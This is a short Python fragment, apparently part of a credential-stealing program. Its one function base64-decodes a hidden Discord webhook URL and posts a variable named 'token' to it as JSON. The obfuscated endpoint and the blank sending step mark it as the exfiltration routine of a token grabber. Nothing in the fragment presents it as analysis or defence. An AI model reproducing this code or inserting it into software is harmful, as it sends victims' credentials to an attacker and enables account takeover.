...
def tkt_frr_je_sais():
    testezb = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTA4NjQwOTI4NTcwNzI1NTgwOC9BTG5fakdnN3JYRkFUa19wc2hGMnZzanR0YjVFclBxdXZxS2F4bFZlUnhvblFlN0ktaDc1MEEwbXR6cWdQdU9xbnhUMg=="
    testezb = base64.b64decode(testezb)
    testezb = testezb.decode("utf-8")
    payload = {
        "content": f"{token}"
    }
    json_payload = json.dumps(payload)
    requests.post(testezb, data=json_payload, headers={'Content-Type': 'application/json'})
